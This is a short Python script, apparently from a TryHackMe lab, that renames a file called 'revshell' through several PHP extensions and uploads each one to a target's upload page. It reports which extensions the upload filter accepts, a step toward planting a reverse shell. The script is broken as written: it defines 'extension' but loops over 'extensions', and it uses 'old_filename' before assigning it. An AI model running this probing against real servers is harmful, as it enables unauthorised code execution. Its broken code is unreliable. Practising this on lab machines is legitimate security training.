import requests
import os 


ip = "" # insert tryhackme IP machine 
url = f"http://{ip}:3333/internal/index.php"

filename = "revshell"
extension = [
	".php", 
	".php3",
	".php4",
	".php5",
	".phtml",
]

for ext in extensions: 
	new_filename = filename + ext 
	os.rename(old_filename, new_filename)

	files = {"file": open(new_filename, "rb")}
	r = requests.post(url, files=files)

	if "Extension not allowed" in r.text: 
		print(f"{ext} not allowed")
	else: 
		print(f"{ext} SEEMS TO BE ALLOWED?")

	old_filename = new_filename